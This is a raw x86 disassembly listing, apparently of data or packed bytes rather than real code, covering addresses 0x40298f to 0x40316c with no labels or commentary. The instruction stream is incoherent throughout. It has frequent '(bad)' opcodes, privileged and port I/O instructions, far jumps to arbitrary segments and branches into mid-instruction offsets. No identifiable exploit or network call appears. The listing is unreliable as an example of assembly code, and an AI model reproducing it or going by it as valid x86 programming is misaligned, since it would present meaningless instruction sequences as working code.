  40298f:	int    0x67
  402991:	data16 mov BYTE PTR [edx+0x8bc1095],bh
  402998:	(bad)  
  402999:	out    dx,eax
  40299a:	js     0x402939
  40299c:	jno    0x402a1d
  40299e:	jg     0x402925
  4029a0:	add    al,0xfb
  4029a2:	retf   0x6a2b
  4029a5:	je     0x402997
  4029a7:	cmp    esp,DWORD PTR [ebp-0x4cd0488a]
  4029ad:	aas    
  4029ae:	push   es
  4029af:	aas    
  4029b0:	pop    ebp
  4029b1:	xor    esi,ebp
  4029b3:	xchg   edx,eax
  4029b4:	sub    eax,0x12697bf8
  4029b9:	or     eax,0xd4c79724
  4029be:	xchg   ebx,eax
  4029bf:	pop    ecx
  4029c0:	pop    eax
  4029c1:	xor    al,0x48
  4029c3:	out    0xa0,al
  4029c5:	fimul  DWORD PTR [ebx*4+0x40a435c3]
  4029cc:	or     dl,BYTE PTR [eax+ebp*4]
  4029cf:	arpl   WORD PTR es:[ebx],bx
  4029d2:	push   esp
  4029d3:	sbb    eax,0x9ebded4b
  4029d8:	jmp    0xf09a55d6
  4029dd:	sub    BYTE PTR [ecx],dl
  4029df:	fidivr DWORD PTR [eax]
  4029e1:	push   eax
  4029e2:	arpl   WORD PTR [edx+ecx*2],si
  4029e5:	jge    0x402a08
  4029e7:	push   es
  4029e8:	jo     0x4029f0
  4029ea:	mov    eax,ds:0xef951647
  4029ef:	ds push edx
  4029f1:	adc    BYTE PTR [esi],bl
  4029f3:	pop    es
  4029f4:	fld    QWORD PTR [ecx+0x39b21a77]
  4029fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029fb:	jne    0x402a7c
  4029fd:	pushf  
  4029fe:	in     eax,0x22
  402a00:	fild   QWORD PTR [edx+0x3f]
  402a03:	inc    edx
  402a04:	std    
  402a05:	gs jmp 0x7438:0xc09ddaa4
  402a0d:	mov    esp,DWORD PTR [esi+edx*1-0x7e]
  402a11:	inc    ebx
  402a12:	pusha  
  402a13:	and    ebp,DWORD PTR [ebx]
  402a15:	(bad)  
  402a16:	std    
  402a17:	xor    BYTE PTR [edi],bh
  402a19:	jmp    0x3009cf7d
  402a1e:	out    0xf2,eax
  402a20:	and    DWORD PTR [ebx+0x3ddf5f32],0x49b36c7a
  402a2a:	jecxz  0x402a47
  402a2c:	and    eax,0xe3a7ca92
  402a31:	jl     0x4029fe
  402a33:	scas   eax,DWORD PTR es:[edi]
  402a34:	cdq    
  402a35:	push   ecx
  402a36:	fisttp QWORD PTR [esi+0x60cc8952]
  402a3c:	popa   
  402a3d:	xchg   ecx,eax
  402a3e:	int3   
  402a3f:	rol    BYTE PTR [edx-0x1de44806],cl
  402a45:	xor    DWORD PTR [ebx],eax
  402a47:	mov    eax,0x8c25bc1e
  402a4c:	pushaw 
  402a4e:	xchg   edx,eax
  402a4f:	dec    ebp
  402a50:	inc    edx
  402a51:	mov    eax,DWORD PTR [eax+esi*8]
  402a54:	mov    ebp,0x5fa45c99
  402a59:	adc    esi,ebp
  402a5b:	mov    bh,0x7b
  402a5d:	data16 loopne 0x402a88
  402a60:	mov    DWORD PTR [ebp-0x2d],esp
  402a63:	mov    esp,0x36c84d9e
  402a68:	mov    esi,0xbe32e949
  402a6d:	std    
  402a6e:	pop    eax
  402a6f:	jb     0x402aed
  402a71:	aam    0xa6
  402a73:	mov    ah,BYTE PTR [esi*4+0x7da4cdb1]
  402a7a:	adc    bl,dl
  402a7c:	mov    esi,0xe719b266
  402a81:	arpl   WORD PTR [esi+0x76],si
  402a84:	xchg   ebp,eax
  402a85:	imul   edx,DWORD PTR [ecx-0x4b],0xffffffdb
  402a89:	or     dh,BYTE PTR [ecx+0x7e]
  402a8c:	push   edi
  402a8d:	mov    ah,0x81
  402a8f:	pop    edx
  402a90:	lea    edx,[edi+0x6019e1a7]
  402a96:	ja     0x402abe
  402a98:	test   al,0xe0
  402a9a:	call   0x8a11:0x8edf308e
  402aa1:	sub    al,0x58
  402aa3:	pop    edi
  402aa4:	fwait
  402aa5:	mov    ah,0xa7
  402aa7:	and    DWORD PTR [ecx-0x142d027d],ebp
  402aad:	sbb    edx,edi
  402aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ab0:	push   0x709c2099
  402ab5:	jecxz  0x402b08
  402ab7:	clc    
  402ab8:	lahf   
  402ab9:	mov    bl,bh
  402abb:	ror    BYTE PTR [esp+esi*4-0x1c],0x38
  402ac0:	push   0x2b
  402ac2:	or     ch,BYTE PTR [ebp-0x6f]
  402ac5:	pop    ebx
  402ac6:	shr    ecx,cl
  402ac8:	push   esp
  402ac9:	fidivr DWORD PTR [edi+0x39665baf]
  402acf:	inc    esp
  402ad0:	rol    bh,0xe
  402ad3:	pop    ss
  402ad4:	gs jns 0x402a63
  402ad7:	int    0x79
  402ad9:	pop    es
  402ada:	icebp  
  402adb:	xor    al,0xc1
  402add:	xchg   edx,eax
  402ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402adf:	loop   0x402b0c
  402ae1:	dec    edx
  402ae2:	inc    ebp
  402ae3:	fmulp  st(2),st
  402ae5:	dec    esi
  402ae6:	xor    al,0x97
  402ae8:	sti    
  402ae9:	fsub   DWORD PTR [esi+ecx*1-0x523b3c24]
  402af0:	mov    WORD PTR [esi],?
  402af2:	xchg   ecx,eax
  402af3:	mov    cl,0xa6
  402af5:	xor    dh,ch
  402af7:	mov    ds,WORD PTR [ecx+0x3652590b]
  402afd:	mov    dl,0xac
  402aff:	mov    bl,0xdd
  402b01:	or     esp,ecx
  402b03:	or     eax,DWORD PTR [edx+0x70]
  402b06:	dec    ecx
  402b07:	test   al,ah
  402b09:	or     DWORD PTR [eax-0x7f9979c6],ecx
  402b0f:	jae    0x402b77
  402b11:	dec    edi
  402b12:	fcmovnbe st,st(4)
  402b14:	dec    edi
  402b15:	sub    edx,edx
  402b17:	out    0x6f,eax
  402b19:	frstor [esi]
  402b1b:	cmc    
  402b1c:	pop    ss
  402b1d:	inc    edx
  402b1e:	aam    0x64
  402b20:	dec    ebx
  402b21:	push   esi
  402b22:	mov    dl,0xb7
  402b24:	push   edi
  402b25:	push   ds
  402b26:	int    0x4f
  402b28:	xor    eax,0x992387fc
  402b2d:	rcr    al,1
  402b2f:	and    eax,0xa8c9f7b5
  402b34:	dec    edx
  402b35:	mov    ebx,0x7f68c511
  402b3a:	les    edx,FWORD PTR [esi-0x726fccc6]
  402b40:	test   eax,0x54e014b3
  402b45:	mov    cl,0xe0
  402b47:	mov    cl,BYTE PTR [edi+0x45]
  402b4a:	or     DWORD PTR [edx-0x5a],0x66
  402b4e:	mov    ch,0xaf
  402b50:	push   eax
  402b51:	xchg   ecx,eax
  402b52:	pop    ebp
  402b53:	add    esi,DWORD PTR [esi+eax*2-0x5c]
  402b57:	inc    ebp
  402b58:	and    ah,BYTE PTR ds:0x325095b2
  402b5e:	jae    0x402bde
  402b60:	jge    0x402b04
  402b62:	pop    ebp
  402b63:	out    0x29,eax
  402b65:	ins    DWORD PTR es:[edi],dx
  402b66:	js     0x402b69
  402b68:	mov    esi,0x965b5cdc
  402b6d:	or     BYTE PTR [eax],bl
  402b6f:	jns    0x402b49
  402b71:	pusha  
  402b72:	lahf   
  402b73:	shr    edx,1
  402b75:	shl    BYTE PTR [ebx+0x7f5444ac],1
  402b7b:	mov    ah,0x31
  402b7d:	pop    esp
  402b7e:	repz inc eax
  402b80:	jne    0x402bff
  402b82:	dec    edx
  402b83:	xchg   esp,eax
  402b84:	or     bl,BYTE PTR [ebx]
  402b86:	cmp    DWORD PTR [ecx],0xffffffe3
  402b89:	loopne 0x402b2d
  402b8b:	or     cl,BYTE PTR [ebx+0x5b]
  402b8e:	ja     0x402b16
  402b90:	or     al,0x43
  402b92:	and    DWORD PTR [ebx+0x6e],edi
  402b95:	dec    ebp
  402b96:	pop    eax
  402b97:	inc    ebx
  402b98:	add    eax,0xdd2907d6
  402b9d:	mov    ebp,0x1ba0a468
  402ba2:	and    BYTE PTR [ebx-0x2d],bh
  402ba5:	lahf   
  402ba6:	and    esp,ebp
  402ba8:	cdq    
  402ba9:	je     0x402b53
  402bab:	mov    ah,0xd2
  402bad:	xor    eax,0x7634b841
  402bb2:	lahf   
  402bb3:	or     DWORD PTR [edx],edx
  402bb5:	jmp    0x9f60:0x1c8871f4
  402bbc:	adc    dh,BYTE PTR [ebx]
  402bbe:	pop    edx
  402bbf:	iret   
  402bc0:	xor    edi,edi
  402bc2:	call   0x9f2d9493
  402bc7:	fmul   DWORD PTR [esi]
  402bc9:	loop   0x402c21
  402bcb:	push   es
  402bcc:	retf   0xafe7
  402bcf:	call   0x5b4d:0x65f62d
  402bd6:	cmc    
  402bd7:	pop    ds
  402bd8:	mov    al,0x10
  402bda:	add    ebp,DWORD PTR [ebx]
  402bdc:	push   cs
  402bdd:	or     bl,ah
  402bdf:	dec    ebp
  402be0:	mov    edi,0x91bacf5e
  402be5:	push   esi
  402be6:	imul   edx,DWORD PTR [ebx+0x2a],0x7d1ac91f
  402bed:	mov    bl,0xfb
  402bef:	and    cl,dl
  402bf1:	retf   
  402bf2:	std    
  402bf3:	aas    
  402bf4:	xlat   BYTE PTR ds:[ebx]
  402bf5:	test   BYTE PTR [edi+eiz*2],bh
  402bf8:	mov    gs,WORD PTR [ecx-0x5cd1ed34]
  402bfe:	cli    
  402bff:	pop    ebp
  402c00:	push   ebp
  402c01:	sbb    DWORD PTR ss:[edx-0x3ad221de],ebx
  402c08:	jecxz  0x402c1d
  402c0a:	dec    esp
  402c0b:	xchg   esi,eax
  402c0c:	mov    DWORD PTR [ecx],esi
  402c0e:	pop    ss
  402c0f:	in     eax,dx
  402c10:	xor    eax,0x4cb61125
  402c15:	retf   0xefc
  402c18:	out    dx,al
  402c19:	into   
  402c1a:	ja     0x402bef
  402c1c:	shl    BYTE PTR [eax],cl
  402c1e:	pop    esi
  402c1f:	sbb    DWORD PTR [ecx+0x74b64c19],0x25285346
  402c29:	sub    esp,DWORD PTR [edi-0x65474bbc]
  402c2f:	imul   BYTE PTR [edx+0x5126ac33]
  402c35:	dec    ebx
  402c36:	scas   eax,DWORD PTR es:[edi]
  402c37:	rol    esi,1
  402c39:	xlat   BYTE PTR ds:[ebx]
  402c3a:	(bad)  
  402c3b:	stos   DWORD PTR es:[edi],eax
  402c3c:	pop    esi
  402c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c3e:	fcmovu st,st(3)
  402c40:	push   edi
  402c41:	mov    eax,0x95911749
  402c46:	jecxz  0x402bf5
  402c48:	inc    ebp
  402c49:	(bad)  
  402c4a:	(bad)  
  402c4c:	imul   ebx,edx,0xffffffd7
  402c4f:	inc    esp
  402c50:	fstp   TBYTE PTR [esi-0x2652b331]
  402c56:	mov    eax,ds:0x26736500
  402c5b:	jmp    0x402c8e
  402c5d:	scas   al,BYTE PTR es:[edi]
  402c5e:	sar    DWORD PTR [eax+0x7f],cl
  402c61:	dec    esi
  402c62:	inc    ecx
  402c63:	cmp    DWORD PTR [ebx+0xa45d402],esi
  402c69:	or     al,0xa3
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	pop    edx
  402c6d:	call   0x549cbeaf
  402c72:	mov    eax,ds:0x93761bf3
  402c77:	mov    ebp,0x80c006f
  402c7c:	mov    esp,0x2b0f9daa
  402c81:	xchg   edi,eax
  402c82:	bnd jns 0x402c35
  402c85:	xor    dh,BYTE PTR [esi]
  402c87:	mov    al,0xac
  402c89:	(bad)  
  402c8a:	sub    ah,bl
  402c8c:	and    cl,dl
  402c8e:	hlt    
  402c8f:	in     eax,dx
  402c90:	int    0xfb
  402c92:	jmp    0x2e1c:0x767253bb
  402c99:	es lahf 
  402c9b:	es pop ebp
  402c9d:	jbe    0x402c7e
  402c9f:	sub    cl,BYTE PTR [edx]
  402ca1:	cli    
  402ca2:	aaa    
  402ca3:	mov    dl,0x3f
  402ca5:	add    al,BYTE PTR [edi]
  402ca7:	xchg   ebp,eax
  402ca8:	popa   
  402ca9:	out    dx,al
  402caa:	je     0x402ccd
  402cac:	ror    ah,0x7
  402caf:	mov    cl,0x68
  402cb1:	xchg   esi,ecx
  402cb3:	mov    ecx,0x9f58729d
  402cb8:	or     DWORD PTR [ebx],ecx
  402cba:	inc    ebp
  402cbb:	adc    al,0xd1
  402cbd:	xchg   ecx,eax
  402cbe:	stc    
  402cbf:	add    bh,cl
  402cc1:	sbb    BYTE PTR [eax-0x11],bh
  402cc4:	in     al,dx
  402cc5:	mov    al,ds:0x69d7c4d6
  402cca:	lods   eax,DWORD PTR ds:[esi]
  402ccb:	sbb    eax,0xfd67089e
  402cd0:	mov    dh,0x58
  402cd2:	and    DWORD PTR [edx+0x3f],ebx
  402cd5:	xchg   ebp,eax
  402cd6:	popf   
  402cd7:	sahf   
  402cd8:	adc    ecx,ebp
  402cda:	mov    al,ds:0x39002bd2
  402cdf:	xchg   ebx,eax
  402ce0:	jle    0x402c69
  402ce2:	in     eax,dx
  402ce3:	addr16 call 0x2a9375b8
  402ce9:	dec    esi
  402cea:	data16 jle 0x402d1d
  402ced:	cmp    DWORD PTR [edx],edi
  402cef:	nop
  402cf0:	pop    eax
  402cf1:	dec    ebx
  402cf2:	(bad)  
  402cf3:	addr16 into 
  402cf5:	popa   
  402cf6:	inc    edx
  402cf7:	jl     0x402c9f
  402cf9:	add    eax,edi
  402cfb:	in     eax,dx
  402cfc:	shr    dh,cl
  402cfe:	pop    ecx
  402cff:	adc    al,0x23
  402d01:	inc    esp
  402d02:	jmp    0x1e9f:0xb74a32e9
  402d09:	pusha  
  402d0a:	in     eax,dx
  402d0b:	or     al,BYTE PTR [edx]
  402d0d:	ret    0xe8ec
  402d10:	and    eax,0x87d77c0c
  402d15:	pop    eax
  402d16:	push   esi
  402d17:	mov    bl,0x3b
  402d19:	mov    ch,BYTE PTR [eax+0x6946c5fc]
  402d1f:	mov    ds:0x2a27f645,eax
  402d24:	jnp    0x402d18
  402d26:	mov    ebx,0xb9c3895d
  402d2b:	test   BYTE PTR [ecx],bl
  402d2d:	test   esp,ebx
  402d2f:	shl    bh,cl
  402d31:	mov    ch,0x3c
  402d33:	jmp    0x6b5bd8d3
  402d38:	dec    esi
  402d39:	add    eax,0xb92f09ed
  402d3e:	div    BYTE PTR [ebp+0x7f]
  402d41:	pop    ebx
  402d42:	retf   0x8e58
  402d45:	jle    0x402d51
  402d47:	pop    ss
  402d48:	call   0xd77c86ae
  402d4d:	push   ss
  402d4e:	mov    edx,DWORD PTR [ebp+0x21]
  402d51:	xor    edi,esi
  402d53:	shr    edx,cl
  402d55:	mov    eax,0xa7a2b7a5
  402d5a:	and    BYTE PTR [ecx+0x6acf9ffc],al
  402d60:	xor    al,0x9f
  402d62:	dec    edx
  402d63:	imul   edx,DWORD PTR [edx],0xffffffb1
  402d66:	pop    edx
  402d67:	xchg   BYTE PTR [eax-0x4],cl
  402d6a:	inc    esi
  402d6b:	adc    eax,0x3ec8d765
  402d70:	mov    al,0xe4
  402d72:	adc    al,0x72
  402d74:	cmp    al,0xb
  402d76:	mov    edx,DWORD PTR [ebx+0xd]
  402d79:	sub    ebx,esi
  402d7b:	(bad)  
  402d7c:	sbb    bl,BYTE PTR [edx]
  402d7e:	jmp    0x4e6014f1
  402d83:	push   esp
  402d84:	xchg   edx,eax
  402d85:	mov    ds:0xd88f2a3d,al
  402d8a:	inc    edx
  402d8b:	mov    ch,0xca
  402d8d:	cmp    DWORD PTR [eax],ebx
  402d8f:	and    DWORD PTR [ebx-0x3e],0x30
  402d93:	mov    eax,0x509f009c
  402d98:	mov    eax,ds:0x85bf2f09
  402d9d:	mov    esi,0x9ba66926
  402da2:	xor    BYTE PTR [esi+edx*2],0x68
  402da6:	or     al,0x2d
  402da8:	aas    
  402da9:	int3   
  402daa:	pusha  
  402dab:	jmp    0x838ce082
  402db0:	loope  0x402dc1
  402db2:	add    BYTE PTR [ebx],cl
  402db4:	popa   
  402db5:	mov    al,ds:0x5a1fcf39
  402dba:	scas   al,BYTE PTR es:[edi]
  402dbb:	jg     0x402e35
  402dbd:	out    0x3e,al
  402dbf:	jle    0x402d47
  402dc1:	loop   0x402d66
  402dc3:	pop    ss
  402dc4:	push   eax
  402dc5:	and    BYTE PTR [ecx],cl
  402dc7:	mov    ecx,0xceb1d4d4
  402dcc:	xor    DWORD PTR [bx],0x55
  402dd0:	mov    ecx,0x5cc53892
  402dd5:	arpl   WORD PTR [eax-0x3e904615],cx
  402ddb:	inc    esi
  402ddc:	aam    0xcb
  402dde:	sbb    bl,cl
  402de0:	pop    edi
  402de1:	into   
  402de2:	test   al,0x82
  402de4:	loopne 0x402e2b
  402de6:	shl    DWORD PTR [eax-0x51],0x4c
  402dea:	test   DWORD PTR ds:0x4ad84242,ebx
  402df0:	adc    al,0x89
  402df2:	xchg   BYTE PTR [ecx+0xd2fa234],ah
  402df8:	jl     0x402e3b
  402dfa:	jb     0x402df1
  402dfc:	or     eax,0x7c
  402dff:	xchg   ecx,eax
  402e00:	data16 jge 0x402dc7
  402e03:	sbb    esp,edi
  402e05:	adc    esi,DWORD PTR [ebx+0x4cd4ee33]
  402e0b:	inc    esi
  402e0c:	(bad)  
  402e0d:	xchg   ebp,eax
  402e0e:	dec    ebp
  402e0f:	and    ax,WORD PTR [esi-0x43ffaad0]
  402e16:	mov    esi,0xae07a073
  402e1b:	inc    edi
  402e1c:	and    al,0x8
  402e1e:	iret   
  402e1f:	push   esp
  402e20:	sub    eax,0x1b63d91f
  402e25:	daa    
  402e26:	fcomp  st(5)
  402e28:	mov    al,ds:0x1244b33a
  402e2d:	ret    
  402e2e:	cmp    esi,DWORD PTR ds:0xca2a60bc
  402e34:	addr16 xchg dh,dl
  402e37:	in     al,0x11
  402e39:	arpl   WORD PTR [edi+0x1bdd6d59],bp
  402e3f:	iret   
  402e40:	jl     0x402e50
  402e42:	sub    eax,ecx
  402e44:	push   ebx
  402e45:	mov    gs,edi
  402e47:	clc    
  402e48:	ret    
  402e49:	push   eax
  402e4a:	sbb    bh,BYTE PTR [edi+0xa]
  402e4d:	test   DWORD PTR [ebx-0x68],ebp
  402e50:	call   0x6d4e:0x78935acf
  402e57:	scas   al,BYTE PTR es:[edi]
  402e58:	aad    0x8e
  402e5a:	ds das 
  402e5c:	xor    dl,BYTE PTR ss:[eax+0x12ad9c34]
  402e63:	rcr    DWORD PTR [ebx+0x14efa406],1
  402e69:	xchg   bl,ah
  402e6b:	jmp    0xa47b0ece
  402e70:	shr    DWORD PTR [ebx-0x5e815f84],cl
  402e76:	or     DWORD PTR [esp+ebp*1-0x5744216c],ebp
  402e7d:	inc    ebp
  402e7e:	ins    DWORD PTR es:[edi],dx
  402e7f:	shl    DWORD PTR [edi-0x101b700f],0x5b
  402e86:	(bad)  
  402e88:	mov    cl,0xc5
  402e8a:	stc    
  402e8b:	out    0x89,al
  402e8d:	gs loope 0x402eff
  402e90:	push   ds
  402e91:	sub    bl,BYTE PTR [ecx-0xf]
  402e94:	sti    
  402e95:	mov    DWORD PTR [edx-0x2b],ebp
  402e98:	enter  0x852,0xb1
  402e9c:	push   eax
  402e9d:	sar    BYTE PTR [edi+0x1f],0xce
  402ea1:	inc    ebx
  402ea2:	push   ds
  402ea3:	loopne 0x402f1c
  402ea5:	popw   ds
  402ea7:	mov    edi,0xa8dd91e0
  402eac:	mov    ah,0x33
  402eae:	(bad)  
  402eaf:	std    
  402eb0:	test   BYTE PTR [esi],0xda
  402eb3:	inc    ecx
  402eb4:	sar    cl,1
  402eb6:	repnz (bad) 
  402eb8:	out    0xcc,eax
  402eba:	cmp    DWORD PTR [eax+0x22],esi
  402ebd:	push   edx
  402ebe:	ja     0x402ee0
  402ec0:	mov    esp,0xb6c4faf0
  402ec5:	jne    0x402ead
  402ec7:	nop
  402ec8:	data16 (bad) 
  402eca:	xor    eax,DWORD PTR [ebx+0x71]
  402ecd:	inc    esi
  402ece:	(bad)  
  402ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ed0:	outs   dx,DWORD PTR ds:[esi]
  402ed1:	cli    
  402ed2:	sbb    al,BYTE PTR [esi+edx*1]
  402ed5:	mov    ecx,ebx
  402ed7:	jns    0x402e98
  402ed9:	ja     0x402f15
  402edb:	cmp    ecx,ebx
  402edd:	fs in  al,0xe6
  402ee0:	mov    edx,0x3bbca721
  402ee5:	mov    ecx,0xe310b4b3
  402eea:	sbb    BYTE PTR ds:0x22224179,ah
  402ef0:	shl    ah,0xad
  402ef3:	nop
  402ef4:	adc    al,0x29
  402ef6:	call   0x4909:0xd5cac340
  402efd:	mov    bl,0x4f
  402eff:	sub    eax,0xdb023a
  402f04:	lock call 0x9f25:0xce14409a
  402f0c:	sti    
  402f0d:	mov    eax,gs:0x52d22d61
  402f13:	jp     0x402f74
  402f15:	fisttp WORD PTR [edi]
  402f17:	mov    ch,0x9d
  402f19:	dec    eax
  402f1a:	pop    edi
  402f1b:	lahf   
  402f1c:	fcom   DWORD PTR [eax+0x24]
  402f1f:	cmc    
  402f20:	ds out 0x8c,eax
  402f23:	mov    eax,0x5a240882
  402f28:	ret    
  402f29:	pop    ecx
  402f2a:	sub    DWORD PTR [eax-0xb864d90],ebp
  402f30:	or     DWORD PTR [ebp+0x5d10f089],ebp
  402f36:	sub    dl,BYTE PTR [ebx+0x1d]
  402f39:	jmp    0x402f14
  402f3b:	outs   dx,DWORD PTR ds:[esi]
  402f3c:	hlt    
  402f3d:	les    eax,FWORD PTR [esi-0x61]
  402f40:	sbb    bh,dh
  402f42:	idiv   DWORD PTR [eax]
  402f44:	loope  0x402f41
  402f46:	and    bh,al
  402f48:	loopne 0x402f76
  402f4a:	bndstx [ebx-0x42f8aafc],(bad)
  402f51:	mov    ecx,0xe967a315
  402f56:	ret    0xf213
  402f59:	add    edx,0xe11bdf76
  402f5f:	adc    ebx,edx
  402f61:	sbb    bh,bl
  402f63:	sahf   
  402f64:	into   
  402f65:	fisub  WORD PTR [edx+ebx*2]
  402f68:	lods   eax,DWORD PTR ds:[esi]
  402f69:	int    0xcf
  402f6b:	nop
  402f6c:	(bad)  
  402f6e:	ret    0xa16c
  402f71:	add    esi,DWORD PTR [esi]
  402f73:	test   DWORD PTR [ecx],0xdf4d214d
  402f79:	xchg   BYTE PTR [ecx+0x64],ah
  402f7c:	adc    BYTE PTR [ebp+0x3a],dh
  402f7f:	jns    0x402f67
  402f81:	or     eax,0x76185bf4
  402f86:	inc    eax
  402f87:	outs   dx,DWORD PTR ds:[esi]
  402f88:	xchg   ebp,eax
  402f89:	pop    edi
  402f8a:	fst    QWORD PTR [eax-0x33]
  402f8d:	mov    al,cl
  402f8f:	sbb    al,BYTE PTR [ebx-0x2]
  402f92:	in     eax,0x50
  402f94:	test   DWORD PTR [edx+eax*4+0x1b],edi
  402f98:	das    
  402f99:	arpl   WORD PTR [edi+0x63],ax
  402f9c:	std    
  402f9d:	mov    bl,BYTE PTR [esi+0x430a610]
  402fa3:	rol    WORD PTR [edx],0x82
  402fa7:	jnp    0x40301c
  402fa9:	push   edx
  402faa:	jp     0x402f38
  402fac:	cmp    eax,0xab1267f1
  402fb1:	dec    DWORD PTR [ebx+0x23f6a4ca]
  402fb7:	dec    ecx
  402fb8:	mov    edx,0xe1ac4707
  402fbd:	xchg   edi,eax
  402fbe:	inc    edi
  402fbf:	repnz aad 0x0
  402fc2:	add    esp,edx
  402fc4:	sub    ch,BYTE PTR [ecx]
  402fc6:	popf   
  402fc7:	and    eax,0xc258ec1a
  402fcc:	outs   dx,DWORD PTR ds:[esi]
  402fcd:	mov    bh,0xe7
  402fcf:	cmp    BYTE PTR [edi-0x4e],al
  402fd2:	mov    ch,0xb4
  402fd4:	retf   
  402fd5:	mov    edx,0x97f1e9b4
  402fda:	push   es
  402fdb:	int    0x78
  402fdd:	icebp  
  402fde:	and    BYTE PTR [edx+0x17],ch
  402fe1:	test   DWORD PTR [ecx],ecx
  402fe3:	test   edi,esi
  402fe5:	pop    esi
  402fe6:	fadd   DWORD PTR [edi-0x64019733]
  402fec:	les    esi,FWORD PTR [eax+0x1f2864d8]
  402ff2:	jl     0x40306e
  402ff4:	sbb    ebp,ebp
  402ff6:	gs mov ebx,0x5ea89c89
  402ffc:	pop    es
  402ffd:	inc    ebp
  402ffe:	in     al,0x44
  403000:	pop    ebx
  403001:	mov    al,0x1a
  403003:	adc    DWORD PTR [ebx+edx*4-0xd0526f8],edi
  40300a:	push   edi
  40300b:	pop    ecx
  40300c:	and    BYTE PTR [ebp-0x23e4b6da],al
  403012:	pop    ss
  403013:	or     al,0xbd
  403015:	jno    0x402ff6
  403017:	xchg   esi,eax
  403018:	ins    DWORD PTR es:[edi],dx
  403019:	test   DWORD PTR [esi-0x1e25b49e],edi
  40301f:	sar    DWORD PTR [esi-0x34],0x60
  403023:	jo     0x40303b
  403025:	pop    edx
  403026:	cs dec esi
  403028:	jg     0x402fd4
  40302a:	and    eax,DWORD PTR [ecx]
  40302c:	loopne 0x403037
  40302e:	mov    ds:0x5224fd65,eax
  403033:	outs   dx,DWORD PTR ds:[esi]
  403034:	pop    edx
  403035:	loopne 0x40304b
  403037:	inc    esp
  403038:	add    eax,0x40ed8b7e
  40303d:	aas    
  40303e:	mov    bl,0xf6
  403040:	repz add al,0x11
  403043:	sbb    al,BYTE PTR [esi]
  403045:	mov    ds:0x770d1d1c,eax
  40304a:	int3   
  40304b:	dec    edi
  40304c:	cmc    
  40304d:	lock jmp FWORD PTR [edx+0x27c22a43]
  403054:	in     al,0xde
  403056:	pop    esp
  403057:	in     eax,0xd6
  403059:	fsub   st(5),st
  40305b:	imul   ecx,DWORD PTR [ebx-0x5c],0x723c5a60
  403062:	sbb    BYTE PTR [ebx+ebp*8],bl
  403065:	sbb    DWORD PTR [edx],ebp
  403067:	ret    
  403068:	mov    ds:0x4aba740e,eax
  40306d:	dec    edi
  40306e:	mov    dh,0xca
  403070:	mov    bl,0xf8
  403072:	(bad)  
  403073:	sbb    ecx,esp
  403075:	xchg   esi,eax
  403076:	cmp    ch,BYTE PTR [edi+0x22cfca21]
  40307c:	(bad)  
  40307d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40307e:	in     eax,dx
  40307f:	sub    esp,eax
  403081:	mov    eax,ds:0xde090489
  403086:	mov    esp,DWORD PTR [edx-0x180a47d]
  40308c:	std    
  40308d:	push   0x680d238
  403092:	or     bh,BYTE PTR [ecx+0x7f]
  403095:	add    DWORD PTR [ecx+0x159b7eee],ebp
  40309b:	inc    ebp
  40309c:	gs xor BYTE PTR fs:[esi],ch
  4030a0:	ss mov bh,0x9d
  4030a3:	fucomi st,st(3)
  4030a5:	add    eax,0x65fa2a60
  4030aa:	rol    DWORD PTR [ebp+0x10],1
  4030ad:	jp     0x4030a0
  4030af:	mov    esp,0x967b3349
  4030b4:	mov    dh,0x62
  4030b6:	int    0x34
  4030b8:	retf   0xf945
  4030bb:	sar    BYTE PTR [esi],cl
  4030bd:	pop    ds
  4030be:	xchg   esp,eax
  4030bf:	out    dx,al
  4030c0:	ins    BYTE PTR es:[edi],dx
  4030c1:	call   0xe09d4c23
  4030c6:	xlat   BYTE PTR ds:[ebx]
  4030c7:	std    
  4030c8:	gs ja  0x4030cc
  4030cb:	xchg   ebx,eax
  4030cc:	fistp  WORD PTR [ecx]
  4030ce:	jp     0x4030f8
  4030d0:	xchg   edx,eax
  4030d1:	int3   
  4030d2:	and    al,0xb0
  4030d4:	ins    DWORD PTR es:[edi],dx
  4030d5:	xor    esi,DWORD PTR [esi-0x52]
  4030d8:	mov    cl,0xb5
  4030da:	xchg   BYTE PTR [edi+0x59],bl
  4030dd:	iret   
  4030de:	push   edx
  4030df:	fbstp  TBYTE PTR [ecx-0x64c44189]
  4030e5:	sahf   
  4030e6:	jle    0x403125
  4030e8:	mov    ecx,0x57975407
  4030ed:	mul    edi
  4030ef:	push   0x5b68edae
  4030f4:	xor    al,0xd0
  4030f6:	xor    dh,BYTE PTR [esi+0x194b3126]
  4030fc:	cmp    eax,0xf06cb62b
  403101:	not    DWORD PTR [ebx+0x17]
  403104:	pop    ebp
  403105:	push   edi
  403106:	sub    ecx,ebp
  403108:	rcl    DWORD PTR [eax+esi*4+0x13],0x4d
  40310d:	xchg   edi,eax
  40310e:	or     ebp,DWORD PTR [eax-0x32]
  403111:	arpl   WORD PTR [ebx-0x14],cx
  403114:	mov    edi,0x149bf6dc
  403119:	push   ebx
  40311a:	push   edx
  40311b:	sbb    esi,ecx
  40311d:	jp     0x403105
  40311f:	push   0xfffffffa
  403121:	mov    ah,0xf5
  403123:	mov    ebx,es
  403125:	push   ds
  403126:	adc    bh,BYTE PTR [ebp-0xea8f08d]
  40312c:	retf   
  40312d:	loop   0x40318f
  40312f:	inc    esi
  403130:	sbb    eax,0x126a5852
  403135:	sahf   
  403136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403137:	xor    DWORD PTR [ebx+0x50],0x49f497d3
  40313e:	rol    BYTE PTR [edx],0xc3
  403141:	jp     0x40314b
  403143:	in     eax,dx
  403144:	xor    BYTE PTR [ebx-0x49],dh
  403147:	mov    ecx,0x4701be73
  40314c:	(bad)  
  40314e:	arpl   WORD PTR [edi],di
  403150:	(bad)  
  403151:	int3   
  403152:	dec    ecx
  403153:	je     0x40310c
  403155:	mov    dh,0x71
  403157:	sbb    bl,BYTE PTR [edx+ecx*4]
  40315a:	mov    fs,ebx
  40315c:	mov    ecx,0x24387a52
  403161:	xor    BYTE PTR [ecx+esi*1],0x48
  403165:	inc    esi
  403166:	mov    ecx,0x9a5c9b9c
  40316b:	push   ebx
  40316c:	cmp    BYTE PTR [ecx+0x70],dl
